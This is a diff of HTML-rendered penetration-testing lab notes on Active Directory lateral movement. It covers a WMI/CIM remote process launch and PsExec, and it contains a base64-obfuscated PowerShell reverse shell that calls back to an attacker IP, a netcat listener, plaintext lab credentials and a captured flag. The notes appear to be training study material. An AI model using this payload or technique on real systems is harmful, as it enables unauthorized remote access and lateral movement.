@@ -228,25 +228,32 @@ corp\jen
 FILES04
 </code></pre>
 <h3>Win domain sys</h3>
-<p>PS C:\Users\jeff&gt; $username = &#39;jen&#39;;
+<pre><code class="language-powershell">PS C:\Users\jeff&gt; $username = &#39;jen&#39;;
 PS C:\Users\jeff&gt; $password = &#39;Nexus123!&#39;;
 PS C:\Users\jeff&gt; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 PS C:\Users\jeff&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 PS C:\Users\jeff&gt; $Options = New-CimSessionOption -Protocol DCOM
 PS C:\Users\jeff&gt; $Session = New-CimSession -ComputerName 192.168.207.72 -Credential $credential -SessionOption $Options
 PS C:\Users\jeff&gt; $Command = &#39;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&#39;;
-PS C:\Users\jeff&gt; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};</p>
-<p>ProcessId ReturnValue PSComputerName</p>
-<hr>
-<pre><code> 3288           0 192.168.207.72
+PS C:\Users\jeff&gt; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+ProcessId ReturnValue PSComputerName
+--------- ----------- --------------
+     3288           0 192.168.207.72
 </code></pre>
 <h3>Kali</h3>
-<p>┌──(operator㉿labhost)-[~/OffSec/AD]
-└─$ nc -lnvp 443<br>listening on [any] 443 ...
-connect to [192.168.45.240] from (UNKNOWN) [192.168.207.72] 53916</p>
-<p>PS C:\Windows\system32&gt; whoami /priv</p>
-<h2>PRIVILEGES INFORMATION</h2>
-<p>Privilege Name                            Description                                                        State<br>========================================= ================================================================== =======
+<pre><code class="language-powershell">┌──(operator㉿labhost)-[~/OffSec/AD]
+└─$ nc -lnvp 443                          
+listening on [any] 443 ...
+connect to [192.168.45.240] from (UNKNOWN) [192.168.207.72] 53916
+
+PS C:\Windows\system32&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
 SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
 SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
 SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
@@ -274,29 +281,26 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 PS C:\Windows\system32&gt; whoami
 corp\jen
 PS C:\Windows\system32&gt; cat \Users\Administrator\Desktop\flag.txt
-OS{d1bd53c44a9141f071b77b2d0a64956a}</p>
-<pre><code>
-
-##### PsExec
-
-PsExec, part of the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/) suite developed by Mark Russinovich, is an extremely versitile tool intended to replace telnet-like applications and provide remote execution of processes on other systems through interactive console.
-
-Misusing the tool for lateral movement has several prerequisites.
-- The user authenticating to the machine must be in local Admin group.
-- The ADMIN$ share must be available.
-- File/printer sharing has to be turned on.
- - Default setting on modern Win servers.
-
-To achieve remote command exec, PsExec performs the following:
-- Writes `psexecsvc.exe` into `C:\Windows` directory.
-- Creates/spawns a service on the remote host.
-- Runs the requested command as a child proc of `psexecsvc.exe`
-
-Let&#39;s assume we have RDP access as local admin `offsec` on CLIENT74, we can run the 64-bit version of PsExec from `C:\Tools\SysinternalsSuite`.
-
-To start an interactive session on the remote host we invoke `PsExec64.exe` with arg `-i`, followed by target hostname which is prepended with `\\`.  Specify `corp\jen` as domain\username and `Nexus123!` as password with `-u`/`-p`.  Finally we include the command for remote exec, a cmd shell in this case.
-```powershell
-PS C:\Tools\SysinternalsSuite&gt; ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+OS{d1bd53c44a9141f071b77b2d0a64956a}
+</code></pre>
+<h5>PsExec</h5>
+<p>PsExec, part of the <a href="https://docs.microsoft.com/en-us/sysinternals/">SysInternals</a> suite developed by Mark Russinovich, is an extremely versitile tool intended to replace telnet-like applications and provide remote execution of processes on other systems through interactive console.</p>
+<p>Misusing the tool for lateral movement has several prerequisites.</p>
+<ul>
+<li>The user authenticating to the machine must be in local Admin group.</li>
+<li>The ADMIN$ share must be available.</li>
+<li>File/printer sharing has to be turned on.</li>
+<li>Default setting on modern Win servers.</li>
+</ul>
+<p>To achieve remote command exec, PsExec performs the following:</p>
+<ul>
+<li>Writes <code>psexecsvc.exe</code> into <code>C:\Windows</code> directory.</li>
+<li>Creates/spawns a service on the remote host.</li>
+<li>Runs the requested command as a child proc of <code>psexecsvc.exe</code></li>
+</ul>
+<p>Let&#39;s assume we have RDP access as local admin <code>offsec</code> on CLIENT74, we can run the 64-bit version of PsExec from <code>C:\Tools\SysinternalsSuite</code>.</p>
+<p>To start an interactive session on the remote host we invoke <code>PsExec64.exe</code> with arg <code>-i</code>, followed by target hostname which is prepended with <code>\\</code>.  Specify <code>corp\jen</code> as domain\username and <code>Nexus123!</code> as password with <code>-u</code>/<code>-p</code>.  Finally we include the command for remote exec, a cmd shell in this case.</p>
+<pre><code class="language-powershell">PS C:\Tools\SysinternalsSuite&gt; ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
 
 PsExec v2.4 - Execute processes remotely
 Copyright (C) 2001-2022 Mark Russinovich
